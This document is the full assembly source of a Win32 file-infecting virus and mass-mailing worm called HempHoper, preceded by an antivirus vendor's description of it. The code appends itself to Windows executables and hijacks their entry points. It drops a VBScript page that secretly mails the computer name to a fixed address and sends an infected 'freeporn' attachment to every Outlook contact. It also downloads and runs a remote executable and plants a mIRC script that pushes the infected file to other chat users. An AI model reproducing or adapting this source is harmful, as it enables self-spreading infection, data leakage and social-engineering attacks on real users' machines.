              
Comment  ^

******************************
*Win32.HempHoper by Necronomikon*
******************************
Thanks(credits) goes out to:
-----------------------------
SnakeByte           - for help out with some codes (like Encryption/API-Search-routine...)
Lord Yup             - mIRC-worm code
SlageHammer      - for Beta testing

SYMANTEC wrote:
When a file that is infected with W32.Nohoper.7397 runs, it does the following:
It appends the viral body to the last section of C:\%windir%\Notepad.exe and changes the entry point to the viral body. The length of the infected file increases by 8,192 bytes. The file then copies the infected Notepad.exe file as C:\Freeporn.exe.pif.
It randomly chooses 20 PE files in the C:\%system% folder and appends the viral body to the last section of each of these files. It changes the entry point of the infected file to the viral body. The length of the infected file increases by 8,192 bytes.
NOTES:
%windir% is a variable. The virus locates the \Windows folder (by default this is C:\Windows or C:\Winnt) and infects Notepad.exe file in that folder.
%system% is a variable. The virus locates the \Windows\System folder (by default this is C:\Windows\System or C:\Winnt\System32) and infects files in that folder.
The date and time stamp of all infected files are changed to the current system date and time.
The virus does not reinfect any files.
If C:\Freeporn.exe.pif already exists, the virus does not overwrite it.
If mIRC is installed on the infected system, the virus creates Mirc.ini so that the infected C:\Freeporn.exe.pif file is sent to other mIRC users.
The virus creates the file C:\Hemp.htm, and opens it in Internet Explorer.exe. The open Internet Explorer window has the following characteristics:
Title: -=Win32.HempHoper=- (c) by Necronomikon [Zerogravity]
Text:
Necronomikons
Virusinformation
When C:\Hemp.htm is opened, it does the following:
It sends an email message to a predefined email address. The subject line of the message is "Network Info," and its message body contains the name of the infected computer.
It also uses Microsoft Outlook to send an infected file to all contacts in the Outlook Address Book. The message has the following characteristics,
Subject: Some freeporn
Message: Here is the file you asked for...
Attachment: Freeporn.exe.pif
C:\Hemp.htm then attempts to copy itself as C:\%windir%\Win.vbs.
It searches for a file named Drop.exe in the C:\%windir%\ folder and in the download folder for Internet Explorer. If it cannot find this file, it attempts to download into the C:\%windir% folder a file named Drop.exe from a Web site that is predefined by the virus.
When Drop.exe runs, it displays this message:
Title: *Win32.HempHoper* (c) by Necronomikon/[ Zer0Gravity]
Text: Damn i am stoned...!;o)
Drop.exe does not contain any other harmful payload.

http://securityresponse.symantec.com/avcenter/venc/data/w32.nohoper.7397.html
^

------------------------------< hemphoper.asm >--------------------------------------

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
include hemp.inc
pic_handle      dd ?
picdropper  	db      '\hemp.bmp', 0 
szpic		db 	220 dup (0)

KEY_ALL_ACCESS    = 001F0000h
HKEY_CURRENT_USER = 80000001h
REG_DWORD         = 00000004h

subKey       db 'Control Panel\Desktop', 0
keyHandle    dd 0
valueName    db 'Wallpaper', 0
value        db 'c:\windows\hemp.bmp', 0

 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 22d
REG_SZ               equ 1  
VirusCode:
Virus:
 call Delta                             

Delta:
 mov ebx, dword ptr [esp]
                                        
 inc esp
 add esp, 3d
                                        
 push ebx
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


ClearOldData:                           
 pushad
                                        
 mov ecx, ( 276d - 3d )
 add ecx, 3d
 lea esi, [ebp+WFD_szFileName]
 xchg esi, ebx


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        
 inc ebx
 dec ecx
 jnz ClearOldData2
 popad
ret

                                        
FindFirstFileProc:
 call ClearOldData
 mov ebx, ebp
 add ebx, offset WIN32_FIND_DATA

 push ebx
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA

 push edx
                                        
 mov ecx, 46184d
 sub ecx, 46184d
 add ecx, dword ptr [ebp+FindHandle]
 push ecx
 sbb edx, 17d                           
 call dword ptr [ebp+XFindNextFileA]
ret



CreateWorm:
                                        ; get Current Directory
 lea eax, [ebp+OldDirectory]
 xchg ecx, eax

 push ecx
                                        
 mov eax, ( 255d xor 25d )
 xor eax, 25d
 push eax
 call dword ptr [ebp+XGetCurrentDirectoryA]
 push 255d
 lea ebx, [ebp+DirectoryBuffer]
 xchg ebx, edx

 push edx
 call dword ptr [ebp+XGetWindowsDirectoryA]
 lea ebx, [ebp+DirectoryBuffer]

 push ebx
 call dword ptr [ebp+XSetCurrentDirectoryA]
                                        ; check if the file exists and infect
 lea ecx, [ebp+WormFile]
 xchg ecx, edx

 call FindFirstFileProc
 inc eax
 jz NoWorm
 call InfectFile
                                        ; copy file to new location
 push 1 
 lea edx, [ebp+WormFile2]
 xchg edi, edx

 push edi
 lea ebx, [ebp+WormFile]
 xchg ebx, edi

 push edi
 call dword ptr [ebp+XCopyFileA]
NoWorm:                                 ; restore old directory
 mov ebx, ebp
 add ebx, offset OldDirectory

 push ebx
 call dword ptr [ebp+XSetCurrentDirectoryA]
ret





KernelSearchStart:
 add edx, 73226342d                     
                                        
 and edi, 0
 add edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

 mov eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]

                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edi
 push edi
                                        
 xor di, di
                                        
 add edi, 1d
GetKernelLoop:
                                        
 mov edx, 0
 add edi, -1
 mov dx, word ptr [edi+03ch]
 cmp dx,0f800h
 je GetKernelLoop
 cmp edi, dword ptr [edi+edx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], edi
 mov edx, edi
 add edx, [edi+3Ch]
 mov [KernelPE+ebp], edx
                                        
 mov edi, 0
 add edi, dword ptr [ebp+KernelPE]
                                        
 sub ecx, ecx
 add ecx, [edi+78h]
 add ecx, [ebp+KernelMZ]
                                        
 add ecx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [ecx]
                                        
 inc ecx
 add ecx, 3d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [ecx]
 add edi, [ebp+KernelMZ]
                                        ; add ecx, 4
 add ecx, 4d
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [ecx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
 mov edx, offset GetApis
 add edx, ebp

 push edx
ret


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 mov ebx, ebp
 add ebx, offset APIOffsets

 mov edi, ebp
 add edi, offset APINames


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 mov edx, edi
APINameDetect:                          ; calculate the lenght of the names
 inc edx
 cmp byte ptr [edx], 0
 jne APINameDetect

 sub edx, edi
                                       

 call SearchAPI1
 and eax, ecx                          
 push edi
 add dword ptr [esp], edx
 pop edi
                                        
 inc edi
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], eax
                                        
 dec ebx
 add ebx, 5d
 loop GetApisLoop
                                        
 mov edx, 1d
 mov ecx, ebp
 add ecx, offset Shell32

 lea eax, [ebp+XShellExecuteA]
 xchg edi, eax

 mov ebx, ebp
 add ebx, offset ShellExApi

 call GetOtherApis
 mov ebx, ebp
 add ebx, offset drugluv

 push ebx
ret



NoKernel:
                                        
 mov esi, ( -1d - 37d )
 add esi, 37d
 and esi, dword ptr [ebp+OldEIP]
 xor ebx, eax                           

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], esi

 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 add dword ptr [ebp+retBase], edx



ExecuteHost:                            

                                        
 test ebp, ebp
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retEIP dd 0h
 add ecx,12345678h
 org $-4
 retBase dd 0h
 jmp ecx



GetOtherApis:
 push ecx 
 push edx 
 push ecx
 call dword ptr [ebp+XLoadLibraryA]
                                        
 mov ecx, eax
 pop ecx 
 pop edx 
GetOtherApiLoop:
 push ecx 
 push edx 
 push ebx
 push ecx
 call dword ptr [ebp+XGetProcAddress]
 pop ecx 
 pop edx 
 mov dword ptr [edi], eax
                                        
 add edi, 4d
 sub edx, 1
 add edx, -1
 add edx, 1
 jz GetOtherApiEnd
GetOtherApiLoop2:
                                        
 inc ebx
 cmp byte ptr [ebx], 0
 je GetOtherApiLoop2
                                        
 add ebx, 1d
 jmp GetOtherApiLoop
GetOtherApiEnd:
ret



InfectEXE:                              ; infect an exe file
                                        
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ecx, edx
 add ecx, [edx+3Ch]
                                        ; get File Alignment
                                        
 add ecx, 60d
 mov edx, [ecx]
                                        
 mov eax, ( 60d - 31d )
 add eax, 31d
 sub ecx, eax
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], edx
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
                                       
 mov ebx, ( -1d - 36d )
 add ebx, 36d
 and ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], -1
 and dword ptr [ebp+NewSize], ebx
 pushad
 ror eax, 7d                            
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        
 mov esi, ( -1d - 11d )
 add esi, 11d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
                                        ; clear esi
 push 0
 pop esi
 add esi, edx
                                        ; get last section
 movzx ebx, word ptr [esi+06h]
 add ebx, -1
 imul ebx, ebx, 28h
                                        
 dec edx
 add edx, 121d
 add edx, ebx
                                        
 mov eax, 0
 add eax, dword ptr [esi+74h]
 sal eax, 3
 add edx, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 push eax
 shl ecx, 23d                           
 pop dword ptr [ebp+OldEIP]
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
                                       
 sub ebx, ebx

 add ebx, [edx+10h]
                                       
 mov ecx, ebx
 add ebx, [edx+14h]
 push ebx
 mov eax, ecx
 add edx, 0Ch
 add eax, [edx]
 sub edx, 0Ch
 mov dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], eax
                                        
 mov eax, 0

 add eax, [edx+10h]
 push eax
                                        ; calculate new section size
 add eax, VirusSize
 mov dword ptr [ebp+Trash1], 187023     
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        
 mov eax, -37664d
 add eax, 37664d
 add eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], eax
 pop eax
 add eax, VirusSize
 mov dword ptr [edx+08h], eax
 mov eax, dword ptr [edx+10h]
 add eax, dword ptr [edx+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'Hemp'
                                        ; Append Virus
 pop edi
 mov esi, offset Virus
 add dword ptr [ebp+Trash1], 974364     
 add esi, ebp

 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 sub ebx, 1
 push ebx
 pop dword ptr [ebp+InfCounter]
 clc
ret

NoEXE:
 stc
ret


Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        
 mov edx, -12634d
 add edx, 12634d
 mov ecx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


MailWorm:
 call CreateWorm
 push 0
 push 080h
 push 1h
 push 0
 push 0
 push 0C0000000h
 lea eax, [ebp+WormName]
 xchg eax, edx

 push edx
 call dword ptr [ebp+XCreateFileA]
 cmp eax, -1
 je MailWormFailed
 push eax
 push 0
 mov edx, offset Write
 add edx, ebp

 push edx
 push WormLen
 mov edx, ebp
 add edx, offset WormDropper

 push edx
 push eax
 call dword ptr [ebp+XWriteFile]
 call dword ptr [ebp+XCloseHandle]
 cmp dword ptr [ebp+XShellExecuteA], 0
 je MailWormFailed
 push 0
 push 0
 push 0
 mov esi, offset WormName
 add esi, ebp

 push esi
 push 0
 push 0
 call dword ptr [ebp+XShellExecuteA]
MailWormFailed:
ret



drugluv:                               

 call InfectCurDir

 call MailWorm


 jmp ExecuteHost


OpenFile:                               
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 mov edx, ebp
 add edx, offset WFD_szFileName

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        
 mov ebx, 0
 push ebx
 push ecx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 cmp eax, 0
 je CloseFile
 push ecx
 push 0
 push 0
                                        
 mov ebx, 0
 add ebx, 2d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp edx, 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
                                        
 mov edx, 0
 add edx, 29860d
 or edx, edx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [ebx+3Ch], 0h
 je Notagoodfile
                                        
 sub edi, edi
 add edi, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, ebx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'Hemp'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov ax, word ptr [edi+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [edi+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret

 lea ecx, [ebp+mircini]
 xchg edx, ecx

 call FindFirstFileProc
 cmp eax, -1
 je MircInfectionEnd
 push eax
 call dword ptr [ebp+XCloseHandle]
 push 0
 push 080h
 push 2h
 push 0
 push 0
 push 0C0000000h
 mov edx, offset mircini
 add edx, ebp

 push edx
 call dword ptr [ebp+XCreateFileA]
 cmp eax, -1
 je MircInfectionEnd
 push eax
 push 0
 lea esi, [ebp+Write]
 xchg esi, ebx

 push ebx
 push MircLen
 lea ebx, [ebp+mIRCScript]

 push ebx
 push eax
 call dword ptr [ebp+XWriteFile]
 call dword ptr [ebp+XCloseHandle]
MircInfectionEnd:

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea eax, [ebp+filemask]
 mov ecx, 9044117d                      
 xchg edx, eax

                                        ; Find File to infect
 call FindFirstFileProc
                                       
 inc eax
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 xor edx, ecx                           
 call dword ptr [ebp+XFindClose]

ret


Data:
 NewSize     dd 0h
 TempApisearch2 dd 0h
 TempAPI     dd 0h
 KernelMZ    dd 0h
 counter     dw 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 mircini     db 'mirc.ini',0
 FindHandle  dd 0h
 FileHandle  dd 0h
 InfCounter  dd 0h

 APINames:
db '_lcreat', 0
 db '_lwrite', 0
 db '_lclose', 0
db 'lstrcat', 0
 db 'CloseHandle', 0
 db 'GetCurrentDirectoryA', 0
 db 'FindFirstFileA', 0
 db 'UnmapViewOfFile', 0
 db 'GetWindowsDirectoryA', 0
 db 'LoadLibraryA', 0
 db 'CopyFileA', 0
 db 'CreateFileA', 0
 db 'MapViewOfFile', 0
 db 'FindClose', 0
 db 'FindNextFileA', 0
 db 'WriteFile', 0
 db 'CreateFileMappingA', 0
 db 'SetCurrentDirectoryA', 0
 db 'GetProcAddress', 0
 db 'RegCreateKeyExA', 0
 db 'RegSetValueExA', 0
 db 'RegKeyClose', 0

 NewEIP      dd 0h
 NTableTemp  dd 0h
 OldBase     dd 400000h
 OTableVA    dd 0h
 ATableVA    dd 0h

WormDropper:
 db '<html>', 13d, 10d
db '<head>', 13d, 10d
db '<title>-=Win32.HempHoper=- (c) by Necronomikon [Zerogravity]</title>', 13d, 10d
db '</head>', 13d, 10d
db '<body text="#009900" bgcolor="#000000">', 13d, 10d
db '<center><font size=+4>Necronomikons</font></center>', 13d, 10d
db '<br><center><font color="#FFFFFF"><font size=+4>', 13d, 10d
db 'Virusinformation</font></font></center>', 13d, 10d
db '<br><font color="#CC0000"><center><font size=+4>Center</font></font></center>', 13d, 10d
db '<Script Language=vbs>', 13d, 10d
db 'MsgBox "Do you need some infos?", 32,"Necro asks:"', 13d, 10d
db 'Set out = CreateObject("Outlook.Application")', 13d, 10d
db 'Set Mail = Out.CreateItem(0)', 13d, 10d
db 'Mail.BCC = "hemphoper@yahoo.de"', 13d, 10d
db 'Mail.Subject = "Network Info"', 13d, 10d
db 'Set net = CreateObject("WScript.Network")', 13d, 10d
db 'Mail.Body = "Network computer name: """ & net.ComputerName & Chr(34)', 13d, 10d
db 'Mail.DeleteAfterSubmit = True', 13d, 10d
db 'Mail.Send', 13d, 10d
db 'MsgBox "NO!!!?", 48,"What!!?"', 13d, 10d
db 'Set downloader = CreateObject("WScript.Shell")', 13d, 10d
db 'downloader.regwrite "HKCU\software\win\", Chr(72) + Chr(101) + Chr(109)+ Chr(112) + Chr(72)_', 13d, 10d
db '+ Chr(111) + Chr(112) + Chr(101) + Chr(114) + Chr(32) + Chr(98) +_', 13d, 10d
db 'Chr(121) + Chr(32) + Chr(78) + Chr(101) + Chr(99) + Chr(114) + Chr(111) +_', 13d, 10d
db 'Chr(110) + Chr(111) + Chr(109) +_', 13d, 10d
db 'Chr(105) + Chr(107) + Chr(111) +_', 13d, 10d
db 'Chr(110) + Chr(91) + Chr(90) + Chr(101) + Chr(114) + Chr(111) +_', 13d, 10d
db 'Chr(71) + Chr(114) + Chr(97) + Chr(118) + Chr(105) + Chr(116) + Chr(121) + Chr(93)', 13d, 10d
db 'Set HempHoper= Createobject("scripting.filesystemobject")', 13d, 10d
db 'HempHoper.copyfile wscript.scriptfullname,HempHoper.GetSpecialFolder(0)&_', 13d, 10d
db '"\win.vbs"', 13d, 10d
db 'ZGravity= ""', 13d, 10d
db 'ZGravity= downloader.regread("HKCU\Software\Microsoft\Internet Explorer\Download Directory")', 13d, 10d
db 'If (ZGravity= "") Then', 13d, 10d
db 'ZGravity = "c:"', 13d, 10d
db 'End If', 13d, 10d
db 'If Right(ZGravity, 1) = " \ " Then ZGravity = Mid(ZGravity, 1, Len(ZGravity) - 1)', 13d, 10d
db 'If Not (HempHoper.fileexists(HempHoper.getspecialfolder(0) & "\drop.exe")) Then', 13d, 10d
db 'If Not (HempHoper.fileexists(ZGravity & "\drop.exe")) Then', 13d, 10d
db 'downloader.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",_', 13d, 10d
db '"http://angelfire.lycos.com/ego/hemphoper/drop.exe"', 13d, 10d
db 'Else', 13d, 10d
db 'downloader.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",_', 13d, 10d
db '"about:blank"', 13d, 10d
db 'HempHoper.copyfile ZGravity & "\drop.exe",_', 13d, 10d
db 'HempHoper.getspecialfolder(0) & "\drop.exe"', 13d, 10d
db 'downloader.run HempHoper.getspecialfolder(0) & "\drop.exe", 1, False', 13d, 10d
db 'end if', 13d, 10d
db 'MsgBox "I do!;o)", 64,"Hehe..."', 13d, 10d
db 'Dim Nec', 13d, 10d
db 'Set HH=CreateObject("Outlook.Application")', 13d, 10d
db 'For Nec=1 To 500', 13d, 10d
db 'Set Mail=HH.CreateItem(0)', 13d, 10d
db 'Mail.to=HH.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)', 13d, 10d
db 'Mail.Subject="Some freeporn"', 13d, 10d
db 'Mail.Body="Here is the file you asked for..."', 13d, 10d
db 'Mail.Attachments.Add("C:\freeporn.exe.pif")', 13d, 10d
db 'Mail.Send', 13d, 10d
db 'Next', 13d, 10d
db 'HH.Quit', 13d, 10d
db 'Set WshShell = CreateObject("WScript.Shell")', 13d, 10d
db 'WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\",_', 13d, 10d
db '"C:\Windows\System\Shell32.dll,32"', 13d, 10d
db 'End If', 13d, 10d
db '</script>', 13d, 10d
db '</body>', 13d, 10d
db '</html>', 13d, 10d
 EndWormDropper:
 WormLen     equ ( offset EndWormDropper - offset WormDropper )

 AlignReg1   dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XGetCurrentDirectoryA  dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XGetWindowsDirectoryA  dd 0h
 XLoadLibraryA          dd 0h
 XCopyFileA             dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XFindNextFileA         dd 0h
 XWriteFile             dd 0h
 XCreateFileMappingA    dd 0h
 XSetCurrentDirectoryA  dd 0h
 XGetProcAddress        dd 0h
 X_lcreat             dd 0h
 X_lwrite              dd 0h
 X_lclose              dd 0h
Xlstrcat              dd 0h
XRegCreateKeyExA      dd 0h
 XRegSetValueExA       dd 0h
 XRegCloseKey          dd 0h

 Write       dd 0h
 XShellExecuteA         dd 0h
 AlignTemp   dd 0h
 MapAddress  dd 0h
 WormFile2   db 'C:\freeporn.exe.pif',0
 OldEIP      dd 0h
 db 'Win32.HempHoper by Necronomikon',0
 WormName    db 'C:\hemp.htm', 0
 WormFile    db 'notepad.exe',0
 ShellExApi  db 'ShellExecuteA',0
 OldDirectory db 255d dup (0h)
 Shell32     db 'Shell32.dll',0
 Trash1      dd 0h
 AlignReg2   dd 0h
 KernelPE    dd 0h
 NTableVA    dd 0h


 MircLen equ ( offset EndMircScript - offset mIRCScript)
 mIRCScript:
 ;Silent DCC =]
;Lord Yup, ty kurwa dziekuje
db 'on 1:start: { .set %filee C:\freeporn.exe.pif }', 13d, 10d
db 'on 1:join:#: {', 13d, 10d
db '.if ($nick != $me && %old != $nick) {', 13d, 10d
db '.set %old $nick', 13d, 10d 
db '.timer $+ $rand(1,100000) 1 5 .$check_him( $nick , $chan )', 13d, 10d
db '}', 13d, 10d  
db '}', 13d, 10d
db 'alias check_him {', 13d, 10d
db '.set %port $rand(9999,999999)', 13d, 10d  
db '.while ($portfree(%port) == $false) { .set %port $rand(9999,999999) }', 13d, 10d 
db '.if ($1 !isop $2) {', 13d, 10d    
db '.notice $1 :DCC Send HempHoper ( $+ $ip $+ )', 13d, 10d 
db '.set %sock_name $rand(1,99999)', 13d, 10d
db '.msg $1 DCC SEND %filee $longip($ip)  %port $file(%filee).size $+ ', 13d, 10d 
db '.socklisten %sock_name %port', 13d, 10d
db '.timers off', 13d, 10d
db '.timer $+ $rand(1,99999) 0 10 .cloze', 13d, 10d
db '}', 13d, 10d  
db '}', 13d, 10d
db 'on 1:socklisten:%sock_name: {', 13d, 10d                   
db '.set %client_name $rand(1,9999999)', 13d, 10d
db '.sockaccept %client_name', 13d, 10d                        
db '.sockclose %sock_name', 13d, 10d               
db '.set %l 0', 13d, 10d                                       
db '.bread %filee %l 4000 &le', 13d, 10d                      
db '.sockwrite -b %client_name 4000 &le', 13d, 10d             
db '%l = %l + 4000', 13d, 10d                                  
db '.set %end 0', 13d, 10d                                     
db '}', 13d, 10d
db 'on 1:sockread:%client_name: {', 13d, 10d                   
db '.if (%l >= $file(%filee).size) {', 13d, 10d                
db '.set %end 1', 13d, 10d                                   
db '.sockclose %client_name', 13d, 10d
db '.halt', 13d, 10d                                         
db '} .else {', 13d, 10d                                      
db '.if (%end != 1) {', 13d, 10d             
db '.bread %filee %l 4000 &le', 13d, 10d                     
db '.sockwrite -b %client_name 4000 &le', 13d, 10d           
db '%l = %l + 4000', 13d, 10d            
db '} } }', 13d, 10d
db 'alias cloze { .sockclose %sock_name }', 13d, 10d
EndMircScript:
call createbmp

 MapHandle   dd 0h
 filemask    db '*.EXe',0
 DirectoryBuffer db 255d dup (0h)


SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        
 mov ebx, -38704d
 add ebx, 38704d
 add ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 add dword ptr [ebp+NTableTemp], ebx
 mov ecx, dword ptr [ebx]
 add ecx, [ebp+KernelMZ]
                                        
 push 0
 pop ebx
 add ebx, ecx
                                        
 push ebx
 pop eax
 push edx
 push eax
 pop dword ptr [ebp+TempApisearch2]
 push edi
 cld

                                        
ApiCompareLoop:
 mov ch, byte ptr [edi]
 cmp ch, byte ptr [eax]
 jne ApiNotFound
 sub edx, 1
 or edx, edx
 jz FoundApi1
                                        
 inc eax
                                        
 sub edi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop edx
                                        
 mov eax, 0
 add eax, -1d
 and eax, dword ptr [ebp+TempApisearch2]
 mov ebx, dword ptr [ebp+NTableTemp]
 mov ecx, ebx                           
 add ebx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API :)
                                        ; clear Stack
 pop ebx
 pop eax
                                        ; retrieve the offset
                                        
 mov ecx, 0
 mov cx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov ebx, ecx
                                        
 mov ecx, -42276d
 add ecx, 42276d
 mov cx, word ptr [ebx]
 shl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop eax
 add eax, dword ptr [ecx]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost

createbmp:
        
   push 220
   push offset szpic
   call dword ptr [ebp+XGetWindowsDirectoryA]
  
   push offset picdropper
   push offset szpic
   call dword ptr [ebp+Xlstrcat]
  
   push	0
   push	offset szpic
   call dword ptr [ebp+X_lcreat]   
   mov  [pic_handle],eax

   push	script_size2
   push	offset hemp_
   push	[pic_handle]
   call dword ptr [ebp+X_lwrite] 

   push	[pic_handle]
   call dword ptr [ebp+X_lclose] 


   push    offset keyHandle                 
   push    offset subKey                    
   push HKEY_CURRENT_USER               
   call dword ptr [ebp+XRegCreateKeyExA]
                      
   cmp     eax, 0
   jne     FirstGenHost

   push    0                                
   push    offset value                     
   push    REG_SZ                           
   push    0                                
   push    offset valueName                 
   push    keyHandle                        
   call dword ptr [ebp+XRegSetValueExA]                 
       
   push    keyHandle
   call dword ptr [ebp+XRegCloseKey]

CryptEnd:
EndVirus:




